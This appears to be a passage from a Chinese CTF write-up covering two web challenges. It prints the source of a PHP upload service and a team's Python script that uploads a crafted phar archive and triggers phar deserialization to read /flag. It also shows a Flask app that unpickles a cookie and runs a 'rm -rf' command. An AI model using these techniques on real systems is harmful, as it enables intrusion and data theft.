<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>	localhost</span><br><span class="line">::<span class="number">1</span>	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::<span class="number">0</span>	ip6-localnet</span><br><span class="line">ff00::<span class="number">0</span>	ip6-mcastprefix</span><br><span class="line">ff02::<span class="number">1</span>	ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span>	ip6-allrouters</span><br><span class="line"><span class="number">172.18.0.2</span>	3b35825919ae</span><br><span class="line"><span class="number">10.10.10.5</span>	3b35825919ae</span><br></pre></td></tr></table></figure>

<p>/proc/net/arp</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">IP</span> address HW type Flags HW address Mask Device</span><br><span class="line"><span class="attribute">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">4</span> <span class="number">0</span>x1 <span class="number">0</span>x0 <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> * eth1</span><br><span class="line"><span class="attribute">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span> <span class="number">0</span>x1 <span class="number">0</span>x2 <span class="number">02</span>:<span class="number">42</span>:<span class="number">0</span>a:<span class="number">0</span>a:<span class="number">0</span>a:<span class="number">0</span>a * eth1</span><br><span class="line"><span class="attribute">4</span> <span class="number">172.18.0.1</span> <span class="number">0</span>x1 <span class="number">0</span>x2 <span class="number">02</span>:<span class="number">42</span>:<span class="number">60</span>:b2:<span class="number">90</span>:eb * eth0</span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$upload</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">   @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload</span>, <span class="number">0333</span>, <span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">       <span class="keyword">include</span> <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>])?!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>]):<span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line">    <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">upload</span>();</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;p class=&#x27;tip&#x27;&gt;guest can not upload file&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了绕这里的  <code>isset($_SESSION)</code></p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> = <span class="string">&quot;http://47.104.95.124:8080/upload.php&quot;</span></span><br><span class="line"><span class="attr">f</span> = io.BytesIO(b<span class="string">&quot;t&quot;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line"><span class="attr">r</span> = requests.post(<span class="attr">url=url,</span> <span class="attr">data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:</span> <span class="string">&quot;2333&quot;</span>&#125;, <span class="attr">files=&#123;&quot;file&quot;:</span> (<span class="string">&quot;233.txt&quot;</span>, f)&#125;, <span class="attr">cookies=&#123;&quot;PHPSESSID&quot;:</span> <span class="string">&quot;2333&quot;</span>&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">do_upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">session_id</span>().<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>])[<span class="number">0</span>].<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;tmp_name&quot;</span>],<span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload  &#x27;</span>.<span class="string">&quot;./&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">e</span>(<span class="variable">$filename</span>).<span class="string">&#x27; success!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">do_upload</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filesize-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;date;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Invalid file!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable language_">$this</span>-&gt;file-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contents = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable language_">$this</span>-&gt;contents);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">0</span>]-&gt;source;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">1</span>]-&gt;schema;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/usr|auto|log/i&#x27;</span> , <span class="variable language_">$this</span>-&gt;source))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable language_">$this</span>-&gt;schema . <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;schema !== <span class="string">&#x27;file:///var/www/html/&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;source !== <span class="string">&#x27;admin.png&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&#x27;admin.png&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后去打一个phar反序列化</p>
<p>队友的直接贴过来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">12</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = <span class="string">f&quot;/Applications/MAMP/bin/php/php7.4.21/bin/php 1.php http:// 10.10.10.<span class="subst">&#123;i&#125;</span>/?url=file:///flag&quot;</span></span><br><span class="line">        res = os.popen(payload).read()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;.phar/.metadata.bin&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(res.strip())</span><br><span class="line">        os.popen(<span class="string">&quot;tar zcvf 1.png  .phar demo.txt&quot;</span>)</span><br><span class="line">        url = <span class="string">&quot;http://47.104.95.124:8080/upload.php&quot;</span></span><br><span class="line">        f = io.BytesIO(<span class="string">b&quot;t&quot;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        r = requests.post(url=url, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;2333&quot;</span>&#125;, files=&#123;<span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>, <span class="string">&quot;rb&quot;</span>)&#125;,</span><br><span class="line">                          cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;2333&quot;</span>&#125;)</span><br><span class="line">        path = r.text.split(<span class="string">&quot; &quot;</span>)[-<span class="number">2</span>].split(<span class="string">&quot;/&quot;</span>)[-<span class="number">2</span>]</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://47.104.95.124:8080/showfile.php?f=phar:///var/www/html/<span class="subst">&#123;path&#125;</span>/1.jpg/demo.txt&quot;</span>,</span><br><span class="line">                         timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="comment"># res = base64.b64decode(r.text.split(&quot;&lt;body&gt;&quot;)[-1].replace(&quot; &quot;, &quot;&quot;).split(&quot;,&quot;)[-2].split(&quot;/&gt;&quot;)[-2])</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="comment"># print(res.decode())</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>error&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h2><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目内容：flag in 504 page</span><br><span class="line">（本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为http://ip:port/ ）</span><br><span class="line">http://59.110.212.61:44589</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># import sqlite3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response,request, session</span><br><span class="line"><span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,static_url_path=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">app.secret_key=random.randbytes(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username,password</span>):</span><br><span class="line">        self.username=username</span><br><span class="line">        self.token=<span class="built_in">hash</span>(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> username==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> admin.secret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># conn=sqlite3.connect(&quot;user.db&quot;)</span></span><br><span class="line">        <span class="comment"># cursor=conn.cursor()</span></span><br><span class="line">        <span class="comment"># cursor.execute(f&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">        <span class="comment"># data=cursor.fetchall()[0]</span></span><br><span class="line">        <span class="comment"># if data:</span></span><br><span class="line">        <span class="comment">#     return data[0]</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     return None</span></span><br><span class="line">        <span class="keyword">return</span> session.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balancer&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    pickle_data=base64.b64decode(request.cookies.get(<span class="string">&quot;userdata&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> pickle_data <span class="keyword">or</span> <span class="string">b&quot;secret&quot;</span> <span class="keyword">in</span> pickle_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You damm hacker!&quot;</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -rf *py*&quot;</span>)</span><br><span class="line">    userdata=pickle.loads(pickle_data)</span><br><span class="line">    <span class="keyword">if</span> userdata.token!=<span class="built_in">hash</span>(get_password(userdata.username)):</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Login First&quot;</span></span><br><span class="line">    <span class="keyword">if</span> userdata.username==<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome admin, here is your next challenge!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You&#x27;re not admin!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>]=request.values.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">&quot;userdata&quot;</span>, base64.b64encode(pickle.dumps(User(request.values.get(<span class="string">&quot;username&quot;</span>),request.values.get(<span class="string">&quot;password&quot;</span>)),<span class="number">2</span>)), max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span 